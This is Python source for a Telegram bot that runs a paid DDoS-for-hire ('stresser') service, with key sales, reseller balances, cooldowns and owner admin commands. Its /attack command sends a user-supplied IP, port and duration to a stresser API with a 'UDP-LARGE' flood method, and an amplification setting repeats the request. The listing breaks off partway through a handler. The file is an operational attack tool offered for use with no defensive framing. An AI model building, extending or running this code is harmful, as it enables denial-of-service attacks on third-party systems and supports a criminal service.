# - Complete Working Bot with Individual Cooldown & Multiple Attacks
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import requests
import psutil
import traceback
import time
from datetime import datetime, timedelta
import json

# ============ CONFIGURATION ============
BOT_TOKEN = os.environ.get('BOT_TOKEN')
BOT_OWNER = 5082501196

# Kimstress API Configuration
API_CONFIG = {
    "url": "",
    "api_key": "",
    "timeout": 30
}

# Attack settings
MIN_ATTACK_TIME = 60
DEFAULT_MAX_ATTACK_TIME = 1000
DEFAULT_USER_COOLDOWN = 20
DEFAULT_MAX_SLOTS = 40000
MAX_SLOTS_LIMIT = 5000000

# Reseller pricing
RESELLER_PRICING = {
    '12h': {'price': 70, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 140, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 250, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 380, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 700, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 900, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

# ============ DATA STORAGE ============
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)

KEYS_FILE = os.path.join(DATA_DIR, "keys.json")
USERS_FILE = os.path.join(DATA_DIR, "users.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
ATTACK_LOGS_FILE = os.path.join(DATA_DIR, "attack_logs.json")
BOT_USERS_FILE = os.path.join(DATA_DIR, "bot_users.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")

def load_json(file_path, default=None):
    if default is None:
        default = {}
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=2, default=str)

# ============ DATA ACCESS FUNCTIONS ============
def get_keys():
    return load_json(KEYS_FILE, {})

def save_keys(keys):
    save_json(KEYS_FILE, keys)

def get_users():
    return load_json(USERS_FILE, {})

def save_users(users):
    save_json(USERS_FILE, users)

def get_resellers():
    return load_json(RESELLERS_FILE, {})

def save_resellers(resellers):
    save_json(RESELLERS_FILE, resellers)

def get_attack_logs():
    return load_json(ATTACK_LOGS_FILE, [])

def save_attack_logs(logs):
    save_json(ATTACK_LOGS_FILE, logs)

def get_bot_users():
    return load_json(BOT_USERS_FILE, {})

def save_bot_users(users):
    save_json(BOT_USERS_FILE, users)

def get_settings():
    return load_json(SETTINGS_FILE, {})

def save_settings(settings):
    save_json(SETTINGS_FILE, settings)

# ============ SETTINGS FUNCTIONS ============
def get_setting(key, default):
    settings = get_settings()
    return settings.get(key, default)

def set_setting(key, value):
    settings = get_settings()
    settings[key] = value
    save_settings(settings)

def get_max_attack_time():
    return get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)

def set_max_attack_time(value):
    set_setting('max_attack_time', value)

def get_user_cooldown():
    return get_setting('user_cooldown', DEFAULT_USER_COOLDOWN)

def set_user_cooldown(value):
    set_setting('user_cooldown', value)

def get_max_slots():
    return get_setting('max_slots', DEFAULT_MAX_SLOTS)

def set_max_slots(value):
    set_setting('max_slots', value)

def get_attack_amplification():
    return get_setting('attack_amplification', 1)

def set_attack_amplification(value):
    set_setting('attack_amplification', value)

def get_maintenance_mode():
    return get_setting('maintenance_mode', False)

def set_maintenance_mode(value, msg=None):
    set_setting('maintenance_mode', value)
    if msg:
        set_setting('maintenance_msg', msg)

def get_maintenance_msg():
    return get_setting('maintenance_msg', "🔧 Bot is in maintenance mode. Please try again later.")

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def get_port_protection():
    return get_setting('port_protection', True)

def set_port_protection(value):
    set_setting('port_protection', value)

# ============ RESELLER PRICING FUNCTIONS ============
def get_reseller_price(duration):
    global RESELLER_PRICING
    saved_price = get_setting(f'price_{duration}', None)
    if saved_price is not None:
        RESELLER_PRICING[duration]['price'] = saved_price
    return RESELLER_PRICING[duration]['price']

def set_reseller_price(duration, price):
    set_setting(f'price_{duration}', price)
    global RESELLER_PRICING
    RESELLER_PRICING[duration]['price'] = price

# ============ BOT INITIALIZATION ============
bot = telebot.TeleBot(BOT_TOKEN)
BOT_START_TIME = datetime.now()

# ============ GLOBAL VARIABLES ============
active_attacks = {}
user_cooldowns = {}
api_in_use = {}
_attack_lock = threading.Lock()

# ============ HELPER FUNCTIONS ============
def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
    try:
        if reply_to:
            try:
                return bot.reply_to(reply_to, text, parse_mode=parse_mode)
            except:
                return bot.send_message(chat_id, text, parse_mode=None)
        else:
            return bot.send_message(chat_id, text, parse_mode=None)
    except Exception as e:
        print(f"Safe send error: {e}")
        return None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    resellers = get_resellers()
    reseller = resellers.get(str(user_id))
    return reseller is not None and not reseller.get('blocked', False)

def get_reseller(user_id):
    resellers = get_resellers()
    return resellers.get(str(user_id))

def has_valid_key(user_id):
    users = get_users()
    user = users.get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    expiry = datetime.fromisoformat(user['key_expiry'])
    return expiry > datetime.now()

def get_time_remaining(user_id):
    users = get_users()
    user = users.get(str(user_id))
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    expiry = datetime.fromisoformat(user['key_expiry'])
    remaining = expiry - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_user_cooldown_time(user_id):
    if str(user_id) in user_cooldowns:
        cooldown_end = user_cooldowns[str(user_id)]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining > 0:
            return int(remaining)
        else:
            del user_cooldowns[str(user_id)]
    return 0

def set_user_cooldown(user_id):
    cooldown_time = get_user_cooldown()
    user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=cooldown_time)

def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        busy_slots = len(api_in_use)
        free_slots = get_max_slots() - busy_slots
        return busy_slots, free_slots, get_max_slots()

def get_free_api_index():
    with _attack_lock:
        busy_indices = set(api_in_use.values())
        for i in range(get_max_slots()):
            if i not in busy_indices:
                return i
        return None

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def check_maintenance(message):
    if get_maintenance_mode() and not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if is_owner(user_id):
        return False
    users = get_users()
    user = users.get(str(user_id))
    if user and user.get('banned'):
        return True
    return False

def log_attack(user_id, username, target, port, duration):
    logs = get_attack_logs()
    logs.append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now().isoformat()
    })
    save_attack_logs(logs[-500:])

def track_bot_user(user_id, username=None):
    users = get_bot_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'user_id': user_id,
            'username': username,
            'first_seen': datetime.now().isoformat()
        }
        save_bot_users(users)

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    return None, None

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    users = get_users()
    for uid, user in users.items():
        if user.get('username') and user['username'].lower() == input_str.lower():
            return int(uid), user['username']
    resellers = get_resellers()
    for rid, reseller in resellers.items():
        if reseller.get('username') and reseller['username'].lower() == input_str.lower():
            return int(rid), reseller['username']
    return None, None

def send_attack_via_api(target, port, duration):
    try:
        params = {
            "key": API_CONFIG['api_key'],
            "host": target,
            "port": int(port),
            "time": int(duration),
            "method": "UDP-LARGE",
            "concurrent": 1
        }
        response = requests.get(API_CONFIG['url'], params=params, timeout=30)
        if response.status_code == 200:
            return True
        return False
    except Exception as e:
        print(f"API error: {e}")
        return False

def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        
        safe_send_message(message.chat.id, f"⚡ Attack Started!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n\n📊 Check /status for updates", reply_to=message)
        
        amp = get_attack_amplification()
        for i in range(amp):
            success = send_attack_via_api(target, port, duration)
            if success:
                print(f"✅ Attack {i+1}/{amp} sent")
            time.sleep(0.5)
        
        time.sleep(duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        
        set_user_cooldown(user_id)
        
        cooldown_time = get_user_cooldown()
        safe_send_message(message.chat.id, f"✅ Attack Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n⏳ Your Cooldown: {cooldown_time}s", reply_to=message)
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        print(f"Attack error: {e}")

def build_status_message(user_id):
    attack_active = user_has_active_attack(user_id)
    cooldown = get_user_cooldown_time(user_id)
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = "━━━━━━━━━━━━━━━━━━━━━\n"
    response += "🔥 *ATTACK STATUS* 🔥\n"
    response += "━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if attack_active:
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == user_id:
                remaining = int((attack['end_time'] - datetime.now()).total_seconds())
                total = attack['duration']
                elapsed = total - remaining
                progress = int((elapsed / total) * 100)
                
                bar_length = 20
                filled = int(bar_length * progress / 100)
                bar = '█' * filled + '░' * (bar_length - filled)
                
                response += f"🎯 *Target:* `{attack['target']}:{attack['port']}`\n"
                response += f"⏱️ *Time remaining:* `{remaining}s`\n"
                response += f"📊 `{bar}` {progress}%\n\n"
                break
    else:
        response += "💤 *No active attack*\n\n"
    
    response += "━━━━━━━━━━━━━━━━━━━━━\n"
    response += "🎮 *SLOT STATUS*\n"
    response += "━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"🟢 Free Slots: `{free_slots}/{total_slots}`\n"
    response += f"🔴 Used Slots: `{busy_slots}/{total_slots}`\n\n"
    
    if cooldown > 0:
        response += f"⏳ *Your Cooldown:* `{cooldown}s`\n"
    
    response += f"⚙️ *Max Time:* `{get_max_attack_time()}s`\n"
    response += "\n━━━━━━━━━━━━━━━━━━━━━"
    
    return response

# ============ TELEGRAM COMMANDS ============

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"`{user_id}`", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = len(get_users())
    maintenance_status = "✅ Disabled" if not get_maintenance_mode() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now() - BOT_START_TIME).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: {1}ms\n"
    response += f"• Bot Status: 🟢 Online\n"
    response += f"• Users: {10}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    cooldown = get_user_cooldown_time(user_id)
    if cooldown > 0:
        safe_send_message(message.chat.id, f"⏳ Your cooldown active! Wait: {cooldown}s\n\nPlease wait before starting another attack.", reply_to=message)
        return
    
    if not has_valid_key(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact owner or reseller to purchase a key.\nOWNER - @DAEMON_OWNER", reply_to=message)
        return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    if free_slots <= 0:
        safe_send_message(message.chat.id, f"❌ All {total_slots} slots are busy!\n\nPlease wait for an attack to finish.\n\n📊 Free: 0/{total_slots}", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, "⚠️ Usage: /attack <ip> <port> <time>\n\nMinimum time: 60 seconds", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    if not validate_target(target):
        safe_send_message(message.chat.id, "❌ Invalid IP!", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, "🚫 This IP is blocked! Use another IP.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"❌ Minimum attack time is {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        max_time = get_max_attack_time()
        if not is_owner(user_id) and duration > max_time:
            safe_send_message(message.chat.id, f"❌ Max time: {max_time}s", reply_to=message)
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            safe_send_message(message.chat.id, "❌ No free slots available! Please wait.", reply_to=message)
            return
        
        with _attack_lock:
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index))
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Port and time must be numbers!", reply_to=message)

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    if not has_valid_key(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Purchase a key first!\nOWNER - @DAEMON_OWNER", reply_to=message)
        return

    response = build_status_message(user_id)
    sent_msg = safe_send_message(message.chat.id, response, reply_to=message)
    
    if user_has_active_attack(user_id):
        threading.Thread(target=auto_update_status, args=(sent_msg.chat.id, sent_msg.message_id, user_id), daemon=True).start()

def auto_update_status(chat_id, message_id, user_id):
    try:
        for _ in range(60):
            time.sleep(2)
            if not user_has_active_attack(user_id) and get_user_cooldown_time(user_id) == 0:
                break
            new_response = build_status_message(user_id)
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id)
            except:
                break
    except:
        pass

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /redeem <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    keys = get_keys()
    key_doc = keys.get(key_input)
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Invalid key!", reply_to=message)
        return
    
    if key_doc.get('used'):
        safe_send_message(message.chat.id, "❌ This key has already been used!", reply_to=message)
        return
    
    users = get_users()
    user = users.get(str(user_id))
    
    expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
    
    users[str(user_id)] = {
        'user_id': user_id,
        'username': user_name,
        'key': key_input,
        'key_expiry': expiry_time.isoformat(),
        'key_duration_seconds': key_doc['duration_seconds'],
        'key_duration_label': key_doc['duration_label'],
        'redeemed_at': datetime.now().isoformat()
    }
    save_users(users)
    
    keys[key_input]['used'] = True
    keys[key_input]['used_by'] = user_id
    keys[key_input]['used_at'] = datetime.now().isoformat()
    save_keys(keys)
    
    remaining = get_time_remaining(user_id)
    safe_send_message(message.chat.id, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, "❌ You don't have a valid key! Contact Owner - @DAEMON_OWNER", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    safe_send_message(message.chat.id, f"🔑 Key Details\n\n⏳ Remaining: {remaining}\n✅ Status: Active", reply_to=message)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id) and not is_reseller(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by owner/reseller!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
        return
    
    duration_key = command_parts[1].lower()
    try:
        count = int(command_parts[2])
        if count < 1 or count > 20:
            safe_send_message(message.chat.id, "❌ Count must be between 1-20!", reply_to=message)
            return
    except:
        safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
        return
    
    if duration_key not in RESELLER_PRICING:
        safe_send_message(message.chat.id, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
        return
    
    pricing = RESELLER_PRICING[duration_key]
    price = get_reseller_price(duration_key)
    total_price = price * count
    
    if is_reseller(user_id) and not is_owner(user_id):
        reseller = get_reseller(user_id)
        balance = reseller.get('balance', 0)
        if balance < total_price:
            safe_send_message(message.chat.id, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs\n💰 Your Balance: {balance} Rs", reply_to=message)
            return
        
        new_balance = balance - total_price
        resellers = get_resellers()
        resellers[str(user_id)]['balance'] = new_balance
        save_resellers(resellers)
    
    keys = get_keys()
    generated_keys = []
    for _ in range(count):
        key = generate_key(12)
        keys[key] = {
            'key': key,
            'duration_seconds': pricing['seconds'],
            'duration_label': pricing['label'],
            'created_at': datetime.now().isoformat(),
            'created_by': user_id,
            'used': False
        }
        generated_keys.append(key)
    save_keys(keys)
    
    keys_text = "\n".join([f"• `{k}`" for k in generated_keys])
    safe_send_message(message.chat.id, f"✅ {count} Key(s) Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {pricing['label']}", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["add_reseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /add_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    resellers = get_resellers()
    if str(reseller_id) in resellers:
        safe_send_message(message.chat.id, "❌ This user is already a reseller!", reply_to=message)
        return
    
    resellers[str(reseller_id)] = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now().isoformat(),
        'blocked': False
    }
    save_resellers(resellers)
    
    safe_send_message(message.chat.id, f"✅ Reseller added!\n\n👤 User: {resolved_name or reseller_id}", reply_to=message)

@bot.message_handler(commands=["remove_reseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_reseller <id or @username>", reply_to=message)
        return
    
    target_id, resolved_name = resolve_user(command_parts[1])
    if not target_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    resellers = get_resellers()
    if str(target_id) not in resellers:
        safe_send_message(message.chat.id, "❌ This user is not a reseller!", reply_to=message)
        return
    
    del resellers[str(target_id)]
    save_resellers(resellers)
    
    safe_send_message(message.chat.id, f"✅ Reseller {resolved_name or target_id} removed successfully!", reply_to=message)
    
@bot.message_handler(commands=["all_resellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    resellers = get_resellers()
    if not resellers:
        safe_send_message(message.chat.id, "📋 No resellers found!", reply_to=message)
        return
    
    response = "📊 **RESELLERS LIST**\n\n"
    
    for rid, reseller in resellers.items():
        username = reseller.get('username', 'Unknown')
        balance = reseller.get('balance', 0)
        response += f"• `{rid}` - {username} - 💰 {balance} Rs\n"
    
    response += f"\n👥 Total: {len(resellers)}"
    safe_send_message(message.chat.id, response)
    
@bot.message_handler(commands=["all_users"])
def all_users_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.send_message(message.chat.id, "❌ Owner only!")
        return
    
    users = get_users()
    if not users:
        bot.send_message(message.chat.id, "📋 No users found!")
        return
    
    response = "📊 USERS LIST\n\n"
    
    for uid, user in users.items():
        username = user.get('username', 'Unknown')
        key_expiry = user.get('key_expiry')
        
        if key_expiry:
            try:
                expiry = datetime.fromisoformat(key_expiry)
                if expiry > datetime.now():
                    remaining_days = (expiry - datetime.now()).days
                    remaining_hours = (expiry - datetime.now()).seconds // 3600
                    response += f"• {uid} - {username} - {remaining_days}d {remaining_hours}h left\n"
                else:
                    response += f"• {uid} - {username} - EXPIRED\n"
            except:
                response += f"• {uid} - {username} - Invalid date\n"
        else:
            response += f"• {uid} - {username} - No key\n"
    
    response += f"\nTotal: {len(users)}"
    safe_send_message(message.chat.id, response)
    
@bot.message_handler(commands=["add_user"])
def add_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.send_message(message.chat.id, "❌ Owner only!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.send_message(message.chat.id, "⚠️ Usage: /add_user <user_id> <days>")
        return
    
    try:
        target_id = int(command_parts[1])
        days = int(command_parts[2])
    except:
        bot.send_message(message.chat.id, "❌ Invalid user ID or days!")
        return
    
    users = get_users()
    expiry_time = datetime.now() + timedelta(days=days)
    
    # Try to get username
    try:
        chat = bot.get_chat(target_id)
        username = chat.username or chat.first_name or str(target_id)
    except:
        username = str(target_id)
    
    users[str(target_id)] = {
        'user_id': target_id,
        'username': username,
        'key_expiry': expiry_time.isoformat(),
        'key_duration_label': f"{days} days",
        'key_duration_seconds': days * 86400,
        'added_at': datetime.now().isoformat()
    }
    save_users(users)
    
    bot.send_message(message.chat.id, f"✅ User {target_id} added for {days} days!\nExpires: {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Notify user
    try:
        bot.send_message(target_id, f"🎉 You have been approved!\n\n📅 Access expires: {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}\n\nUse /attack to start!")
    except:
        pass

@bot.message_handler(commands=["remove_user"])
def remove_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_user <id or @username>", reply_to=message)
        return
    
    target_id, resolved_name = resolve_user(command_parts[1])
    if not target_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    users = get_users()
    if str(target_id) in users:
        del users[str(target_id)]
        save_users(users)
        safe_send_message(message.chat.id, f"✅ User {resolved_name or target_id} removed from database!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ User not found in database!", reply_to=message)

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo_add <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    resellers = get_resellers()
    if str(reseller_id) not in resellers:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    resellers[str(reseller_id)]['balance'] = resellers[str(reseller_id)].get('balance', 0) + amount
    save_resellers(resellers)
    
    safe_send_message(message.chat.id, f"✅ Balance Added!\n\n👤 Reseller: {resolved_name or reseller_id}\n➕ Added: {amount} Rs\n💰 New Balance: {resellers[str(reseller_id)]['balance']} Rs", reply_to=message)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    user_id = message.from_user.id
    if not is_reseller(user_id):
        safe_send_message(message.chat.id, "❌ You are not a reseller!", reply_to=message)
        return
    
    reseller = get_reseller(user_id)
    safe_send_message(message.chat.id, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs", reply_to=message)

@bot.message_handler(commands=["prices"])
def prices_command(message):
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command is for resellers only!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "💵 KEY PRICING\n"
    response += "═══════════════════════════\n\n"
    
    for dur, info in RESELLER_PRICING.items():
        price = get_reseller_price(dur)
        response += f"🔴 {info['label']:<9} ➜  {price} Rs\n"
    
    response += "\n═══════════════════════════"
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["max_concurrent"])
def max_concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_max_slots()
        safe_send_message(message.chat.id, f"⚙️ Current Max Slots: {current}\n\nUsage: /max_concurrent <number>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > MAX_SLOTS_LIMIT:
            safe_send_message(message.chat.id, f"❌ Value must be between 1 and {MAX_SLOTS_LIMIT}!", reply_to=message)
            return
        set_max_slots(new_value)
        safe_send_message(message.chat.id, f"✅ Max Concurrent Slots set to: {new_value}", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_user_cooldown()
        safe_send_message(message.chat.id, f"⏳ Current Cooldown: {current}s\n\nUsage: /cooldown <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, "❌ Cooldown cannot be negative!", reply_to=message)
            return
        set_user_cooldown(new_value)
        safe_send_message(message.chat.id, f"✅ Cooldown set to: {new_value}s", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["max_attack"])
def max_attack_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"⚙️ Current Max Attack Time: {current}s\n\nUsage: /max_attack <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Value must be at least {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        set_max_attack_time(new_value)
        safe_send_message(message.chat.id, f"✅ Max Attack Time set to: {new_value}s", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["concurrent"])
def concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_attack_amplification()
